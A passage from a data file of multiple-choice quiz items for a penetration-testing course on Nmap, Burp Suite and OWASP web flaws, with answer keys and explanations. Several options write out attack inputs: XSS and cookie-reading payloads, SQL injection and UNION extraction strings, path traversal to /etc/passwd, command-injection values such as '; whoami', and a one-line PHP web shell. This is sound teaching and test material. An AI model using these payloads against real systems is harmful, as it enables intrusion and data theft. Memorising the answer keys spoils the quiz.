          "Ping sweeps identify live hosts across an IP range before more detailed per-host scanning begins.",
      },
    ],
  },
  {
    topicId: "m7-4",
    questions: [
      {
        question: "Which Nmap flag attempts OS fingerprinting?",
        options: ["-sV", "-O", "-sn", "-sU"],
        correctIndex: 1,
        explanation:
          "-O attempts OS detection/fingerprinting, while -sV detects service versions.",
      },
      {
        question: "What does 'nmap -sn 192.168.0.0/24' do?",
        options: [
          "Performs a full UDP scan",
          "Performs a host-discovery/ping sweep without port scanning",
          "Performs OS detection only",
          "Scans all 65535 TCP ports",
        ],
        correctIndex: 1,
        explanation:
          "-sn performs host discovery (ping sweep) without scanning ports on discovered hosts.",
      },
      {
        question:
          "Why might a pentester start with the default top-1000 ports rather than a full 'nmap -p-' scan?",
        options: [
          "Because the top-1000 covers the most commonly used services faster, before running the slower, more thorough full scan",
          "Because full scans are illegal",
          "Because -p- only scans UDP ports",
          "Because top-1000 scans are always more accurate",
        ],
        correctIndex: 0,
        explanation:
          "A full 65535-port scan is thorough but slow, so scanning the common top-1000 ports first gives a faster initial picture.",
      },
    ],
  },
  {
    topicId: "m7-5",
    questions: [
      {
        question: "What does the --script vuln option do in Nmap?",
        options: [
          "Runs a single targeted exploit",
          "Runs a broad set of vulnerability-detection NSE scripts against discovered services",
          "Only performs host discovery",
          "Disables service version detection",
        ],
        correctIndex: 1,
        explanation:
          "--script vuln runs Nmap's collection of vulnerability-detection scripts across the scanned services.",
      },
      {
        question:
          "In the worked example, discovering vsftpd 2.3.4 via -sV and then checking CVE Details/Exploit-DB revealed which known issue?",
        options: [
          "A DNS cache poisoning vulnerability",
          "A known backdoor (CVE-2011-2523)",
          "A buffer overflow in SSH",
          "A weak TLS cipher suite",
        ],
        correctIndex: 1,
        explanation:
          "vsftpd 2.3.4 is known to contain a backdoor tracked as CVE-2011-2523, discoverable by cross-referencing the -sV version output.",
      },
      {
        question:
          "What is a named example of an NSE script targeting a specific known vulnerability?",
        options: ["smb-vuln-ms17-010", "ping-sweep", "arp-scan", "port-list"],
        correctIndex: 0,
        explanation:
          "smb-vuln-ms17-010 is a named NSE script specifically checking for the MS17-010 (EternalBlue) SMB vulnerability.",
      },
    ],
  },
  {
    topicId: "m7-6",
    questions: [
      {
        question:
          "What data sources do tools like subfinder and amass typically query?",
        options: [
          "Only the target's internal DNS server",
          "Certificate transparency logs, DNS records, and search engines",
          "Only social media profiles",
          "Only WHOIS records",
        ],
        correctIndex: 1,
        explanation:
          "subfinder/amass/dnsx passively query multiple public sources including certificate transparency logs and DNS records.",
      },
      {
        question: "crt.sh is a manual source used for which recon purpose?",
        options: [
          "Cracking password hashes",
          "Certificate transparency log lookups to find subdomains",
          "Performing active Nmap scans",
          "Analysing PCAP files",
        ],
        correctIndex: 1,
        explanation:
          "crt.sh lets you search certificate transparency logs, often revealing subdomains registered on certificates.",
      },
      {
        question:
          "Why is subdomain enumeration valuable to an attacker/pentester?",
        options: [
          "Subdomains never run any applications",
          "Subdomains often run older, forgotten, or less-hardened applications, expanding the attack surface",
          "It reduces the attack surface",
          "It replaces the need for port scanning entirely",
        ],
        correctIndex: 1,
        explanation:
          "Forgotten/legacy subdomains frequently run outdated or misconfigured applications, significantly expanding what's exploitable.",
      },
    ],
  },
  {
    topicId: "m7-7",
    questions: [
      {
        question:
          "What is the difference between a credentialed and non-credentialed vulnerability scan?",
        options: [
          "Credentialed scans log in to the target for deeper visibility; non-credentialed scans do not",
          "They produce identical results always",
          "Non-credentialed scans are always more thorough",
          "Credentialed scans cannot be run internally",
        ],
        correctIndex: 0,
        explanation:
          "Credentialed scans authenticate to the target for deeper, more accurate findings, while non-credentialed scans only see what's visible externally.",
      },
      {
        question: "What is Nessus's free tier called?",
        options: [
          "Nessus Pro",
          "Nessus Essentials",
          "Nessus Cloud",
          "OpenVAS Free",
        ],
        correctIndex: 1,
        explanation:
          "Nessus Essentials is Tenable's free tier of the Nessus vulnerability scanner.",
      },
      {
        question:
          "What is the general vulnerability-scanning workflow described in this topic?",
        options: [
          "Exploit first, then scan",
          "Find devices, check for weaknesses, assess risk (severity), then remediate",
          "Remediate before scanning",
          "Cover tracks then scan",
        ],
        correctIndex: 1,
        explanation:
          "The described workflow is: find devices, check for weaknesses, assess risk by severity, then remediate.",
      },
    ],
  },
  {
    topicId: "m7-8",
    questions: [
      {
        question: "Vertical privilege escalation is best described as:",
        options: [
          "A user accessing another same-level user's data",
          "A lower-privileged user gaining admin/root access",
          "Encrypting a file with a stronger algorithm",
          "Scanning a wider IP range",
        ],
        correctIndex: 1,
        explanation:
          "Vertical privesc means a lower-privileged user gains higher (e.g. admin/root) privileges.",
      },
      {
        question: "Horizontal privilege escalation is best described as:",
        options: [
          "A regular user reaching an admin dashboard",
          "A user accessing another same-level user's data (e.g. User A viewing User B's files)",
          "Root gaining more root access",
          "Scanning subdomains",
        ],
        correctIndex: 1,
        explanation:
          "Horizontal privesc involves accessing another user's data at the same privilege level, rather than gaining a higher privilege tier.",
      },
      {
        question:
          "Which of the following is named as a common flaw enabling privilege escalation?",
        options: [
          "Strong password hashing",
          "IDOR (predictable IDs)",
          "TLS 1.3 usage",
          "DNSSEC",
        ],
        correctIndex: 1,
        explanation:
          "IDOR (predictable object references), client-side role manipulation, and missing server-side authorization checks are named as common enabling flaws.",
      },
    ],
  },
  {
    topicId: "m7-9",
    questions: [
      {
        question:
          "Which post-exploitation activity involves moving from the initial compromised host to others in the network?",
        options: [
          "Persistence",
          "Lateral movement",
          "Data exfiltration",
          "Covering tracks",
        ],
        correctIndex: 1,
        explanation:
          "Lateral movement is pivoting from the first compromised host to other systems within the network.",
      },
      {
        question:
          "Registry Run keys and cron jobs are examples of which post-exploitation activity?",
        options: [
          "Data exfiltration",
          "Persistence mechanisms to survive reboot/reconnect",
          "Lateral movement",
          "Reconnaissance",
        ],
        correctIndex: 1,
        explanation:
          "Scheduled tasks, registry Run keys, and cron jobs are common persistence mechanisms.",
      },
      {
        question:
          "When is 'covering tracks' ever appropriate according to this programme?",
        options: [
          "In every engagement automatically",
          "Only within an authorised red-team scope",
          "Only for unauthorised attackers",
          "Never under any circumstances",
        ],
        correctIndex: 1,
        explanation:
          "Covering tracks (clearing logs/artefacts) is only relevant within an authorised red-team engagement's defined scope.",
      },
    ],
  },
  {
    topicId: "m7-10",
    questions: [
      {
        question:
          "Which section of a pentest report is intended for a non-technical audience?",
        options: [
          "Detailed Findings",
          "Executive Summary",
          "Exploitation Difficulty ratings",
          "Strategic Recommendations only",
        ],
        correctIndex: 1,
        explanation:
          "The Executive Summary is specifically written for a non-technical audience, unlike the Detailed Findings section.",
      },
      {
        question:
          "Business Impact in a pentest report is typically expressed using:",
        options: ["CVSS scoring", "Base64 encoding", "VLAN IDs", "ARP tables"],
        correctIndex: 0,
        explanation:
          "Business Impact/severity is typically scored using the CVSS (Common Vulnerability Scoring System).",
      },
      {
        question:
          "Which compliance-standard reporting frameworks are named as differing in required elements?",
        options: [
          "HTTP and DNS",
          "PCI-DSS, CREST, CERT, FedRAMP, CHECK",
          "TCP and UDP",
          "RSA and AES",
        ],
        correctIndex: 1,
        explanation:
          "PCI-DSS, CREST, CERT, FedRAMP, and CHECK are named as distinct compliance reporting frameworks with different required elements.",
      },
    ],
  },
  {
    topicId: "m7-11",
    questions: [
      {
        question: "What must a Rules of Engagement (RoE) document define?",
        options: [
          "Only the final invoice amount",
          "Exactly what's in scope, what's off-limits, testing windows, and emergency contacts",
          "The pentester's personal salary",
          "The target's marketing materials",
        ],
        correctIndex: 1,
        explanation:
          "RoE defines scope boundaries, off-limits systems, testing windows, and emergency contacts before testing begins.",
      },
      {
        question:
          "What must exist before touching any system you don't personally own?",
        options: [
          "A verbal agreement only",
          "Written authorisation",
          "A Shodan search",
          "A completed Nmap scan",
        ],
        correctIndex: 1,
        explanation:
          "Written authorisation must be obtained before any active technique is used against a system you don't own.",
      },
      {
        question: "When should scope be discussed and defined with management?",
        options: [
          "After the engagement is complete",
          "Before any active technique is used",
          "Only if a vulnerability is found",
          "Only during covering tracks",
        ],
        correctIndex: 1,
        explanation:
          "Scope and RoE must be agreed with management before any active testing begins.",
      },
    ],
  },
  {
    topicId: "m7-12",
    questions: [
      {
        question:
          "What is the correct order of activities in this end-to-end recon lab?",
        options: [
          "Nessus scan, then Nmap scan, then passive OSINT",
          "Passive OSINT, then active Nmap scan, then Nessus vulnerability scan",
          "Nmap scan, then passive OSINT, then Nessus scan",
          "All three run simultaneously with no order",
        ],
        correctIndex: 1,
        explanation:
          "The lab explicitly starts with passive OSINT, moves to active Nmap scanning, then finishes with a Nessus vulnerability scan.",
      },
      {
        question:
          "Which lab VM is named as a common target for this style of exercise?",
        options: [
          "Windows 11 Pro",
          "Metasploitable2",
          "macOS Ventura",
          "iOS 17",
        ],
        correctIndex: 1,
        explanation:
          "Metasploitable2 is the named example lab VM used for this Nmap/Nessus recon exercise.",
      },
      {
        question: "What should the final recon report from this lab include?",
        options: [
          "Only a list of employee names",
          "Open ports, services, OS, subdomains, and any known CVEs found",
          "Only the Nessus installation steps",
          "A single screenshot with no analysis",
        ],
        correctIndex: 1,
        explanation:
          "The lab asks for a short recon report covering open ports, services, OS, subdomains, and any known CVEs discovered.",
      },
    ],
  },
  {
    topicId: "m8-1",
    questions: [
      {
        question: "Which Burp Suite edition rate-limits Intruder attacks?",
        options: [
          "Professional",
          "Community (free)",
          "Enterprise",
          "Burp Suite DAST",
        ],
        correctIndex: 1,
        explanation:
          "The free Community edition throttles/rate-limits Intruder attacks, unlike the paid Professional edition.",
      },
      {
        question:
          "Which of the following is NOT one of Burp's core tools listed for this topic?",
        options: ["Repeater", "Intruder", "Decoder", "Wireshark"],
        correctIndex: 3,
        explanation:
          "Wireshark is a separate packet-capture tool; Burp's core tools include Proxy, Repeater, Intruder, Decoder, Comparer, and Sequencer.",
      },
      {
        question: "What does Burp Suite fundamentally allow a tester to do?",
        options: [
          "Only view network cabling diagrams",
          "Capture and manipulate all HTTP/HTTPS traffic between browser and server",
          "Crack password hashes offline",
          "Perform Wi-Fi packet injection",
        ],
        correctIndex: 1,
        explanation:
          "Burp is a proxy-based framework for capturing and manipulating HTTP/HTTPS traffic between the browser and the server.",
      },
    ],
  },
  {
    topicId: "m8-2",
    questions: [
      {
        question: "What port does Burp's proxy listen on by default?",
        options: [
          "127.0.0.1:80",
          "127.0.0.1:8080",
          "127.0.0.1:443",
          "127.0.0.1:22",
        ],
        correctIndex: 1,
        explanation: "Burp's Proxy listener defaults to 127.0.0.1:8080.",
      },
      {
        question:
          "Why must Burp's CA certificate be installed in the browser's trust store?",
        options: [
          "To speed up page loading",
          "To intercept HTTPS traffic without triggering certificate warnings",
          "To enable Intruder attacks",
          "To change the proxy port",
        ],
        correctIndex: 1,
        explanation:
          "Since Burp performs a MITM on HTTPS, installing its CA certificate in the browser avoids certificate trust warnings.",
      },
      {
        question:
          "What browser extension is used to route browser traffic through Burp's proxy?",
        options: ["FoxyProxy", "uBlock Origin", "LastPass", "Grammarly"],
        correctIndex: 0,
        explanation:
          "FoxyProxy is the extension used to toggle the browser's traffic through Burp's proxy (127.0.0.1:8080).",
      },
    ],
  },
  {
    topicId: "m8-3",
    questions: [
      {
        question: "What does turning on Intercept in Burp's Proxy tab do?",
        options: [
          "Automatically forwards every request unmodified",
          "Pauses each captured request for manual editing before you click Forward",
          "Deletes all HTTP history",
          "Disables HTTPS entirely",
        ],
        correctIndex: 1,
        explanation:
          "With Intercept on, each request is paused so it can be edited before being forwarded to the server.",
      },
      {
        question:
          "Why is intercepting a login POST request useful for testing?",
        options: [
          "It allows tampering with parameters to attempt bypassing client-side checks entirely",
          "It only shows response headers",
          "It automatically finds SQL injection",
          "It replaces the need for Repeater",
        ],
        correctIndex: 0,
        explanation:
          "Intercepting lets the tester edit the raw request before it reaches the server, bypassing any client-side-only validation.",
      },
      {
        question:
          "Where can you review every request/response Burp has captured, even after Intercept is turned off?",
        options: [
          "Proxy, HTTP History",
          "Decoder tab",
          "Comparer tab",
          "Target, Scope only",
        ],
        correctIndex: 0,
        explanation:
          "Proxy then HTTP History logs every captured request/response for later review.",
      },
    ],
  },
  {
    topicId: "m8-4",
    questions: [
      {
        question: "What is Repeater primarily used for?",
        options: [
          "Automating brute-force attacks across many payloads",
          "Manually resending and iterating on the same captured request repeatedly",
          "Encoding/decoding data",
          "Scanning for vulnerabilities automatically",
        ],
        correctIndex: 1,
        explanation:
          "Repeater lets you manually edit and resend the same request as many times as needed for iterative testing.",
      },
      {
        question:
          "What is the typical workflow to send a captured request to Repeater?",
        options: [
          "Decoder, then Comparer, then Repeater",
          "Right-click a captured request, Send to Repeater, edit a parameter, Send",
          "Target, Scope, Repeater automatically",
          "Intruder to Repeater conversion only",
        ],
        correctIndex: 1,
        explanation:
          "The described workflow is right-click a request, Send to Repeater, edit, then Send.",
      },
      {
        question:
          "Manual SQL injection testing is best suited to which Burp tool?",
        options: ["Repeater", "Comparer", "Sequencer", "Decoder"],
        correctIndex: 0,
        explanation:
          "Repeater is ideal for trial-and-error payload crafting like manual SQL injection testing, per this topic.",
      },
    ],
  },
  {
    topicId: "m8-5",
    questions: [
      {
        question:
          "In Intruder, which attack type tests every combination of multiple payload sets across multiple positions?",
        options: [
          "Sniper",
          "Cluster Bomb",
          "Battering Ram",
          "Pitchfork-only mode",
        ],
        correctIndex: 1,
        explanation:
          "Cluster Bomb tests every combination across multiple payload sets/positions -- ideal for username+password pairs.",
      },
      {
        question:
          "Which attack type cycles one payload set through one position at a time?",
        options: ["Cluster Bomb", "Sniper", "Battering Ram", "Grep-Match"],
        correctIndex: 1,
        explanation:
          "Sniper cycles a single payload set through one position, ideal for testing a single parameter.",
      },
      {
        question:
          "What does the Grep-Match option in Intruder's Options tab do?",
        options: [
          "Encodes payloads automatically",
          "Flags a specific string (e.g. 'Welcome back') appearing in each response, letting you instantly spot a correct guess",
          "Deletes non-matching responses",
          "Automatically decrypts TLS traffic",
        ],
        correctIndex: 1,
        explanation:
          "Grep-Match flags responses containing a defined string, making it easy to spot the successful attempt among many results.",
      },
    ],
  },
  {
    topicId: "m8-6",
    questions: [
      {
        question: "What encodings/functions does Burp's Decoder support?",
        options: [
          "Only Base64",
          "Base64, URL, HTML encoding/decoding, and common hash functions",
          "Only AES encryption",
          "Only SQL syntax highlighting",
        ],
        correctIndex: 1,
        explanation:
          "Decoder supports Base64, URL, HTML encoding/decoding, and common hash functions.",
      },
      {
        question: "A practical use of Decoder mentioned in this topic is:",
        options: [
          "URL-encoding a '/' to %2f to smuggle a path-traversal character past a naive filter",
          "Cracking bcrypt hashes offline",
          "Performing a live Nmap scan",
          "Generating an RSA keypair",
        ],
        correctIndex: 0,
        explanation:
          "Decoder can URL-encode characters like '/' to %2f to bypass simple filters, as described in this topic.",
      },
      {
        question: "Which of these is a typical Decoder use case?",
        options: [
          "Decoding captured information or encoding a payload correctly before sending it to the target",
          "Managing VLANs",
          "Running a Nessus scan",
          "Editing the Windows registry",
        ],
        correctIndex: 0,
        explanation:
          "Decoder transforms data on the fly -- decoding captured data or encoding payloads before they're sent.",
      },
    ],
  },
  {
    topicId: "m8-7",
    questions: [
      {
        question: "Which Burp edition includes the automated Scanner tool?",
        options: [
          "Community",
          "Professional",
          "Both equally",
          "Neither edition includes Scanner",
        ],
        correctIndex: 1,
        explanation:
          "Burp's automated Scanner is a Professional-edition feature; Community lacks it.",
      },
      {
        question:
          "What is the difference between passive and active scanning in Burp?",
        options: [
          "Passive analyses traffic you generate normally without extra requests; Active sends crafted/malicious requests to probe for vulnerabilities",
          "Passive sends extra requests; Active only observes",
          "They are identical",
          "Passive only works on HTTPS",
        ],
        correctIndex: 0,
        explanation:
          "Passive scanning flags issues from normal traffic without extra requests; Active scanning proactively sends crafted probes.",
      },
      {
        question:
          "Since Community edition lacks Scanner, what does this course rely on primarily instead?",
        options: [
          "Manual tools like Repeater and Intruder",
          "Only Nessus",
          "Only automated scanning via OpenVAS",
          "No testing tools at all",
        ],
        correctIndex: 0,
        explanation:
          "Since Community lacks Scanner, the course relies primarily on manual Repeater/Intruder-based testing.",
      },
    ],
  },
  {
    topicId: "m8-8",
    questions: [
      {
        question: "What is the purpose of Target, Scope in Burp?",
        options: [
          "To encrypt traffic",
          "To keep Burp focused only on the application under test, filtering out unrelated domains/trackers",
          "To generate RSA keys",
          "To crack passwords",
        ],
        correctIndex: 1,
        explanation:
          "Defining scope filters HTTP History/Site map to in-scope traffic only, reducing noise from unrelated domains.",
      },
      {
        question: "What does the Target tab's Site map show?",
        options: [
          "A tree of every URL Burp has observed for the app",
          "A list of cracked passwords",
          "A network topology diagram",
          "A CVE database",
        ],
        correctIndex: 0,
        explanation:
          "The Site map builds a tree of every observed URL for the application under test.",
      },
      {
        question:
          "Why would a pentester add the target domain to Scope before testing?",
        options: [
          "To make Burp ignore the target entirely",
          "To filter out noise from unrelated domains/third-party trackers seen in traffic",
          "To disable Intercept",
          "To install the CA certificate",
        ],
        correctIndex: 1,
        explanation:
          "Adding the target domain to scope filters out unrelated third-party domains/trackers from cluttering the view.",
      },
    ],
  },
  {
    topicId: "m8-9",
    questions: [
      {
        question:
          "What is the first step before intercepting any traffic in this lab?",
        options: [
          "Enable FoxyProxy pointing at 127.0.0.1:8080",
          "Run an Nmap scan",
          "Generate an RSA keypair",
          "Install Nessus",
        ],
        correctIndex: 0,
        explanation:
          "FoxyProxy must be installed/enabled pointing at Burp's listener before traffic will route through Burp.",
      },
      {
        question:
          "After turning on Intercept and submitting a login form, what should you observe in Burp?",
        options: [
          "The raw captured POST request, including submitted parameters",
          "A cracked password hash",
          "A Nessus vulnerability report",
          "A subnet calculation",
        ],
        correctIndex: 0,
        explanation:
          "The lab has you observe the raw captured POST request in the Proxy tab before forwarding it.",
      },
      {
        question:
          "What does the lab suggest trying after capturing the login request, to observe app behaviour?",
        options: [
          "Removing an otp parameter and forwarding the request",
          "Deleting the entire request",
          "Disabling FoxyProxy mid-request",
          "Switching to Decoder only",
        ],
        correctIndex: 0,
        explanation:
          "The lab suggests tampering a field like removing the otp parameter, then forwarding to see how the app responds.",
      },
    ],
  },
  {
    topicId: "m8-10",
    questions: [
      {
        question: "What is the example SQLi payload used in this Repeater lab?",
        options: [
          "Gifts' OR 1=1 --",
          "<script>alert(1)</script>",
          "../../../etc/passwd",
          "1|whoami",
        ],
        correctIndex: 0,
        explanation:
          "The lab's example payload injects Gifts' OR 1=1 -- into the category parameter.",
      },
      {
        question:
          "What keyboard shortcut in Burp URL-encodes a highlighted payload before sending?",
        options: ["Ctrl+U", "Ctrl+E", "Ctrl+R", "Ctrl+D"],
        correctIndex: 0,
        explanation:
          "Highlighting a payload and pressing Ctrl+U URL-encodes it in Burp before sending.",
      },
      {
        question:
          "How do you know a manual SQL injection attempt succeeded in this lab?",
        options: [
          "The response returns rows the original query shouldn't have returned",
          "The server returns a 500 error every time",
          "The request is automatically blocked",
          "Burp displays a green padlock icon",
        ],
        correctIndex: 0,
        explanation:
          "A successful injection is confirmed when the response includes unintended rows/data the original query should not have returned.",
      },
    ],
  },
  {
    topicId: "m8-11",
    questions: [
      {
        question:
          "Which attack type is used for this password-spray lab against a single password field?",
        options: ["Cluster Bomb", "Sniper", "Battering Ram", "Pitchfork"],
        correctIndex: 1,
        explanation:
          "The lab specifies marking the password field and choosing the Sniper attack type.",
      },
      {
        question:
          "What payload set type is used to load the wordlist in this lab?",
        options: [
          "Simple list",
          "Numbers",
          "Character substitution",
          "Recursive grep",
        ],
        correctIndex: 0,
        explanation:
          "The lab loads a small wordlist as a 'Simple list' payload set in Intruder.",
      },
      {
        question: "How does the lab identify which password attempt succeeded?",
        options: [
          "By enabling Grep-Match for a string only present on successful login (e.g. 'Welcome')",
          "By checking the HTTP status code is always 200",
          "By counting response time only",
          "By checking the response is empty",
        ],
        correctIndex: 0,
        explanation:
          "Grep-Match flags responses containing a success-only string like 'Welcome', instantly identifying the correct password.",
      },
    ],
  },
  {
    topicId: "m9-1",
    questions: [
      {
        question:
          "Which CWE is the root-cause classification for Cross-Site Scripting (XSS)?",
        options: ["CWE-89", "CWE-79", "CWE-77", "CWE-943"],
        correctIndex: 1,
        explanation:
          "CWE-79 (Improper Neutralization of Input During Web Page Generation) is specifically the XSS root-cause weakness class.",
      },
      {
        question:
          "Which of the following is listed as a core best practice threaded through the OWASP Top 10 mitigations?",
        options: [
          "Trust client-side validation alone",
          "Use parameterised queries",
          "Store passwords in plaintext for speed",
          "Disable all server logging",
        ],
        correctIndex: 1,
        explanation:
          "Parameterised queries separate code from data, which is one of the repeated best practices across almost every injection-class vulnerability.",
      },
      {
        question:
          "Per this topic's key points, which CWE corresponds to OS Command Injection?",
        options: ["CWE-79", "CWE-89", "CWE-77", "CWE-943"],
        correctIndex: 2,
        explanation:
          "CWE-77 is Improper Neutralization of Special Elements used in a Command, the root-cause class for command injection.",
      },
    ],
  },
  {
    topicId: "m9-2",
    questions: [
      {
        question:
          "Which payload demonstrates breaking out of an HTML attribute context to trigger XSS via an event handler?",
        options: [
          "<script>alert(1)</script>",
          "\"><img src=x onerror=alert('XSS')>",
          "' OR 1=1 --",
          "{{7*7}}",
        ],
        correctIndex: 1,
        explanation:
          'The leading "> closes the existing attribute/tag before injecting an img element whose onerror handler executes JS, a classic attribute-context breakout distinct from a plain script tag.',
      },
      {
        question:
          "Which payload proves an attacker could exfiltrate the victim's session token rather than merely proving script execution?",
        options: [
          "<script>alert(1)</script>",
          "<script>alert(document.cookie)</script>",
          "<?php system($_GET['cmd']); ?>",
          "../../../../etc/passwd",
        ],
        correctIndex: 1,
        explanation:
          "alert(document.cookie) surfaces the victim's cookie value, demonstrating real impact beyond just proving JavaScript runs.",
      },
      {
        question:
          "Which XSS variant is considered highest severity because the payload persists server-side and is served to every visitor automatically?",
        options: ["Reflected", "Stored", "DOM-based", "Blind SQLi"],
        correctIndex: 1,
        explanation:
          "Stored XSS saves the payload server-side (e.g. in a comment) and delivers it to every viewer without needing a victim to click a crafted link.",
      },
    ],
  },
  {
    topicId: "m9-3",
    questions: [
      {
        question:
          "Which payload is a classic authentication-bypass technique appended to a login form's password field?",
        options: [
          "' OR 1=1 --",
          "{{7*7}}",
          "<script>alert(1)</script>",
          "../../../etc/passwd",
        ],
        correctIndex: 0,
        explanation:
          "' OR 1=1 -- closes the string literal, adds an always-true condition, then comments out the rest of the query, bypassing the WHERE clause check.",
      },
      {
        question:
          "Before a UNION-based payload like ' UNION SELECT null, username, password FROM users-- will work, what must the attacker determine?",
        options: [
          "The database server's hostname",
          "The number of columns returned by the original query",
          "The web server's operating system",
          "The victim's session cookie value",
        ],
        correctIndex: 1,
        explanation:
          "UNION SELECT requires the injected query to return the same number of columns as the original query, so column count must be established first.",
      },
      {
        question:
          "In Blind SQL injection, how is data typically extracted when there is no visible query output in the response?",
        options: [
          "By reading response differences to true/false conditions or timing delays",
          "By reading the HTTP response headers only",
          "By directly viewing the database file",
          "By using CSRF tokens",
        ],
        correctIndex: 0,
        explanation:
          "Blind SQLi has no direct data output, so attackers infer data character-by-character from boolean response differences or time-based delays.",
      },
    ],
  },
  {
    topicId: "m9-4",
    questions: [
      {
        question:
          "A user changes /receipt/12345 to /receipt/12346 in the URL and views another customer's receipt. What is this called?",
        options: ["CSRF", "IDOR", "SSTI", "Reflected XSS"],
        correctIndex: 1,
        explanation:
          "IDOR (Insecure Direct Object Reference) occurs when a predictable object reference is exposed without proper authorization validation.",
      },
      {
        question:
          "Reaching a hidden admin panel by directly navigating to its path after finding a hint in robots.txt is an example of:",
        options: [
          "Forced browsing",
          "SSRF",
          "SQL injection",
          "A business logic flaw",
        ],
        correctIndex: 0,
        explanation:
          "Forced browsing means directly navigating to a page that isn't linked in the UI but is still reachable if you know or guess the path.",
      },
      {
        question:
          "A normal authenticated user manages to reach an admin-only function. What type of privilege escalation is this?",
        options: ["Horizontal", "Vertical", "Lateral", "Blind"],
        correctIndex: 1,
        explanation:
          "Vertical privilege escalation means moving from a lower-privileged role to a higher-privileged one; horizontal is accessing another same-level user's data.",
      },
    ],
  },
  {
    topicId: "m9-5",
    questions: [
      {
        question:
          "Which of these values, submitted to a vulnerable 'file' parameter, demonstrates a path traversal attack?",
        options: [
          "../../../../etc/passwd",
          "' OR 1=1 --",
          "<script>alert(1)</script>",
          "{{7*7}}",
        ],
        correctIndex: 0,
        explanation:
          "The repeated ../ sequences walk up out of the intended directory to reach an absolute path like /etc/passwd, the classic traversal payload.",
      },
      {
        question:
          "Given the vulnerable pattern readfile('/var/www/html/uploads/' . $_GET['file']), which mitigation is most effective?",
        options: [
          'Blacklisting the string "../"',
          "Canonicalising the path and restricting it to a fixed base directory",
          "Renaming the uploads folder",
          "Adding a CAPTCHA to the download page",
        ],
        correctIndex: 1,
        explanation:
          "Blacklisting specific strings is easily bypassed with encoding or nesting tricks; canonicalising the resolved path and enforcing it stays within an allowed base directory is the robust fix.",
      },
      {
        question: "Path traversal is also commonly known as:",
        options: [
          "Directory traversal",
          "Cross-site scripting",
          "Business logic bypass",
          "Mass assignment",
        ],
        correctIndex: 0,
        explanation:
          '"Path traversal" and "directory traversal" are used interchangeably to describe the same class of vulnerability.',
      },
    ],
  },
  {
    topicId: "m9-6",
    questions: [
      {
        question:
          'Given os.system(f"cat {user_input}"), which submitted value would reveal the identity of the user running the web server process?',
        options: [
          "filename.txt",
          "filename.txt; whoami",
          "' OR 1=1 --",
          "{{7*7}}",
        ],
        correctIndex: 1,
        explanation:
          "The ; operator sequentially chains a second command (whoami) onto the original cat command, executing it with the same privileges as the server process.",
      },
      {
        question:
          "Which shell operator only runs the second command if the first command fails?",
        options: [";", "&&", "||", "|"],
        correctIndex: 2,
        explanation:
          "|| is a logical OR — the second command executes only if the preceding command returns a non-zero (failure) exit code.",
      },
      {
        question:
          "In the payload 1|whoami against a stock-checker parameter, what is the role of the | operator?",
        options: [
          "It sequences the two commands regardless of success or failure, same as ;",
          "It pipes the first command's output into whoami, and whoami's own output ultimately reaches the response",
          "It only executes whoami if the stock-check command fails",
          "It escapes the whoami command so it is treated as literal text",
        ],
        correctIndex: 1,
        explanation:
          "| chains the attacker's own command (whoami) into the pipeline so its output is what gets returned in the response, confirming command injection.",
      },
    ],
  },
  {
    topicId: "m9-7",
    questions: [
      {
        question:
          "Why does the auto-submitting hidden form in the CSRF proof-of-concept succeed without the victim entering credentials?",
        options: [
          "It steals the victim's password via a keylogger",
          "The browser automatically attaches the victim's existing session cookies to the forged request",
          "It exploits a SQL injection in the login form",
          "It requires the victim to type their password into the malicious page",
        ],
        correctIndex: 1,
        explanation:
          "CSRF relies on the browser automatically including cookies on any request to the target domain, so the forged request rides on the victim's already-authenticated session.",
      },
      {
        question:
          "Which of the following is the standard CSRF mitigation that ties a unique value to the user's session and validates it server-side?",
        options: [
          "Rate limiting",
          "Anti-CSRF tokens",
          "Password complexity rules",
          "TLS certificate pinning",
        ],
        correctIndex: 1,
        explanation:
          "A unique, unpredictable anti-CSRF token embedded in each state-changing form and validated server-side ensures the request truly originated from the legitimate application.",
      },
      {
        question:
          "Which cookie attribute, when set appropriately, helps prevent a cookie from being sent along with cross-site requests?",
        options: ["HttpOnly", "Secure", "SameSite", "Max-Age"],
        correctIndex: 2,
        explanation:
          "The SameSite cookie attribute (Lax or Strict) instructs the browser not to send the cookie on cross-site requests, directly mitigating CSRF.",
      },
    ],
  },
  {
    topicId: "m9-8",
    questions: [
      {
        question:
          "In the DOM-based XSS lab, what must you identify before crafting a working payload?",
        options: [
          "The database schema",
          "The vulnerable source and sink pair (e.g. location.search feeding into document.write)",
          "The server's TLS certificate",
          "The CSRF token value",
        ],
        correctIndex: 1,
        explanation:
          "DOM XSS lives entirely client-side, so the exploit path depends on which untrusted source flows into which dangerous sink.",
      },
      {
        question:
          "For the reflected XSS lab, which payload proves basic script execution in the search field?",
        options: [
          "' OR 1=1 --",
          "<script>alert(1)</script>",
          "../../../etc/passwd",
          "{{7*7}}",
        ],
        correctIndex: 1,
        explanation:
          "A simple <script>alert(1)</script> in a reflected parameter is the standard first proof-of-concept for confirming unsanitised script execution.",
      },
      {
        question:
          "Why does the stored XSS lab use alert(document.cookie) rather than just alert(1)?",
        options: [
          "To demonstrate the payload could exfiltrate a victim's session cookie, showing real impact",
          "Because alert(1) doesn't work in stored contexts",
          "Because cookies are required to submit the comment",
          "To bypass a WAF",
        ],
        correctIndex: 0,
        explanation:
          "Showing document.cookie in the alert demonstrates the payload can access sensitive session data, illustrating real-world impact beyond a simple proof-of-concept.",
      },
    ],
  },
  {
    topicId: "m9-9",
    questions: [
      {
        question:
          "In the WHERE-clause lab, which Burp tool is used to send and modify the category filter request?",
        options: ["Intruder", "Repeater", "Sequencer", "Decoder"],
        correctIndex: 1,
        explanation:
          "Repeater is used to manually modify and resend a single request repeatedly while testing injection payloads.",
      },
      {
        question:
          "When extracting the blind SQLi admin password character-by-character with Intruder, what confirms a correct character guess?",
        options: [
          "A Grep-Match hit on a string only present when the condition is true",
          "An HTTP 500 error",
          "A redirect to the login page",
          "A change in response content-length only for failed guesses",
        ],
        correctIndex: 0,
        explanation:
          "Grep-Match flags responses containing a marker string that only appears when the injected boolean condition evaluates true, automating detection across many requests.",
      },
      {
        question:
          "What determines when a UNION-based injection is ready to actually extract data?",
        options: [
          "Once the number of NULL columns in UNION SELECT matches the original query's column count",
          "Once you find the admin's password hash",
          "Once the WAF is disabled",
          "Once you know the server's IP address",
        ],
        correctIndex: 0,
        explanation:
          "A UNION SELECT must return exactly as many columns as the original query for the database to accept it; only then can real column values replace the NULLs.",
      },
    ],
  },
  {
    topicId: "m9-10",
    questions: [
      {
        question:
          "In the IDOR lab, changing /download-transcript/2.txt to /download-transcript/1.txt accomplishes what?",
        options: [
